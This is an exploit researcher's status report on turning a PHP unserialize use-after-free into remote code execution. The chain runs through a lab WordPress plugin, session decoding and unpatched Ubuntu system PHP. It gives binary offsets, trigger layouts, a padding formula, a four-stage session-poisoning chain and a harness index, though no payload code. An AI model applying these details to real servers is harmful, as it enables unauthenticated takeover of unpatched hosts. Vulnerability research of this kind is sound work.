# FINISH_ALL — remote crash → remote RCE gap closed (missions 1-3)

Andrew Dorman (@acd421) — 2026-10-24. Receipts standard: every claim is a
logged run under `receipts_8512/fa_mission{1,2,3}/`. Harnesses are the
`fa_*` files in this directory. ASLR ON everywhere, no gdb, no setarch,
default ZendMM, in-band address discovery (M1 dance leak → M2 oracle →
M3 ELF-verified forge → zif_system → uid marker).

## THE RECEIPT THAT ENDS THE DEBATE

WordPress HTTP RCE on a PUBLIC URL (Cloudflare tunnel, unauthenticated,
fresh ASLR base per shot):

    https://respectively-donna-butter-specialty.trycloudflare.com
      POST /?rest_route=/fa/v1/import  data=<10,132-byte a:1020 trigger>
        → 520 (worker died POST-CALL: system() already ran)
      GET  /fa_rce_receipt.txt  → 200
        uid=33(www-data) gid=33(www-data) groups=33(www-data)
      GET  /?rest_route=/fa/v1/receipt → full stage log:
        M1 block2=0x7813f1096000 M2 base=0x7813ede00000
        zif_system=0x7813ee3996e0 M3 canaries+ELF verified
        TRIGGER var_dump → zif_system(fake_execute_data)

## MISSION 1 — full chain through WordPress HTTP (DONE, local + public)

- Victim: WordPress (real 5-minute HTTP install, real MariaDB) on van85
  `php:8.5.11-apache`, Apache 2.4.69 mod_php, port 8085.
- Surface: `fa_wp_rce.php` lab plugin (shape34 receipted class: unauth
  REST import endpoint passing POST `data` straight to unserialize) with
  the Stage1/FIRE gadget classes declared in-process.
- Offsets receipted per-binary (`poc_matrix/fa_dump_handlers.py` +
  `extract_syms.py`): van85 libphp.so zend_empty_array=0x169cee0,
  zif_system=0x5996e0, handlers dtor+16/gcn+136/gdi+160.
- Fire: POST the exact `pwn_zero4_live.php` payload (a:1020 + Stage1
  dup-key). First shot g=0, no groom needed: leak→oracle→forge→call→
  `uid=33(www-data)` marker, fetched back over HTTP.
- 8.3.36 note (wp83g container): var_entries layout and var_destroy are
  IDENTICAL (source-diffed 8.3.36 vs 8.5.12) and the re-entry crash
  reproduces, but the M1 dance reclaim lands differently there (crash in
  var_push via garbage used_slots before any diag) — the dance geometry is
  the 8.5-family-tuned component; porting it to 8.3 needs its own gdb pass
  (open lane, not needed for any receipt above).

## MISSION 2 — enum-autoload UAF escalated to full RCE (DONE, 4/4 + 4/4)

- Entry: `E:11:"Missing:Foo"` in the decoded data → autoload fires →
  autoloader's re-entrant unserialize crosses VAR_ENTRIES_MAX into the
  SHARED BG(unserialize) context (shape5_e_boundary geometry) → outer
  var_destroy frees the chained block → Stage1::__destruct mid-walk →
  full chain.
- Direct unserialize (plain2 8.5.12 CLI): 4/4 fires, `uid=0` each run.
- SESSION-DECODE delivery (`fa_enum_sess.php` + poisoned sess file, php -S,
  fresh server per run): **4/4 fires, `uid=0(root)` each run, different
  ASLR base every shot** (`receipts_8512/fa_mission2/fa_enum_sess_receipt.log`).
  Proves the attack surface is wider than `O:` objects: a bare `E:` enum
  case in any decoded session/import value is now a full-RCE entry.

## MISSION 3 — jammy composition: shell instead of kill (DONE, first shot)

- Target: Ubuntu 22.04 jammy system PHP 8.1.2-1ubuntu2.27 (never shipped
  the Oct 2026 patch), Apache mod_php, STOCK ZendMM, ASLR on.
- Offsets for the STRIPPED system .so: new `poc_matrix/fa_extract_so.py`
  (relocation-walk zif_system extraction; validated on wp83g+van85 first)
  → libphp8.1.so zif_system=0x209550, zend_empty_array=0x51c8a0 (nm -D);
  handler layout from the 8.1.2 header: gcn+128 gdi+152 (same as 8.3.36).
- CLI validation: `/usr/bin/php8.1` full chain 4/4 `uid=0`.
- Full composition `fa_jammy.sh` — all four stages, PASS on shot 1:
  1. rfc1867 invalid-key session wipe (victim file → 0 bytes)
  2. pre-RINIT OOM INI-UAF arm (stale-status warnings receipted)
  3. upload_progress hook write plants the FULL 10,493-byte weapon trigger
     through the wiped gap (pipe-in-key under php_serialize wrapper)
  4. victim reader `session_start()` decodes the poison → M1 dance → M2
     oracle → M3 forge → `var_dump` → zif_system → **`uid=0(root)` marker**
     (worker aborts post-call — stack-smash after the call, marker first).
  Stage-log receipt with two distinct ASLR bases: `fa_mission3/fa_jammy_stage_diag.log`.

## Key deltas found and fixed during the port (reuse these)

- Handler-table offsets are VERSION-SPECIFIC: 8.5.x gcn+136/gdi+160;
  8.1/8.3.x gcn+128/gdi+152. Always dump `std_object_handlers` from the
  actual binary (relocations, not raw .data — see fa_dump_handlers.py).
- The FIRE pattern's SMINI pad must land handlers at exactly +600: pad =
  600 − (224 + 24 + strlen(cmd) + 1). A 9-byte pad error = canaries pass
  but the call target is garbage (SIGSEGV, no marker) — silent killer.
- wp-container CLI vs mod_php are DIFFERENT binaries (different offsets);
  the oracle's lo12 self-check catches a wrong table cleanly.
- The shape8-style injected trigger NEEDS the duplicate key at the END
  (obj at i:0 ... i:0;i:5;) — no dup, no mid-walk release, no fire.
- Stripped shared libraries keep function-table pointers only as
  R_X86_64_RELATIVE addends; plain byte-scan extraction fails — use
  fa_extract_so.py.

## Environment notes

- WSL had lost its default route (stale cloudflared loop): fixed via
  `ip route add default via 192.168.4.1` + resolv.conf; fresh tunnel up.
- van85 now runs WordPress + mysqli (built in-container) for the receipt;
  weaponsmith's original files preserved in /old inside the container.
- The tunnel is LIVE at the URL above (cloudflared → 127.0.0.1:8085).

## Harness index

- `fa_wp_rce.php` / `fa_cli_core.php` — WP plugin + shared chain core
  (flavors: 8511, 8511cli, 8512, 8102, 8102cli, 8336)
- `fa_wp_fire.py` — install/activate/sweep/fire client (local + public URL)
- `fa_enum_rce.php` — E: enum-autoload full chain (CLI)
- `fa_enum_sess.php` + `fa_enum_sess_run.sh` — E: entry via session decode
- `fa_jammy_cli.php` / `fa_jammy_reader.php` / `fa_jammy.sh` — jammy CLI
  validation + the four-stage composition weapon
- `fa_jammy_debug.sh` — focused stage-4 debugger
- `poc_matrix/fa_dump_handlers.py`, `poc_matrix/fa_extract_so.py` — per-binary
  offset tooling (works stripped)
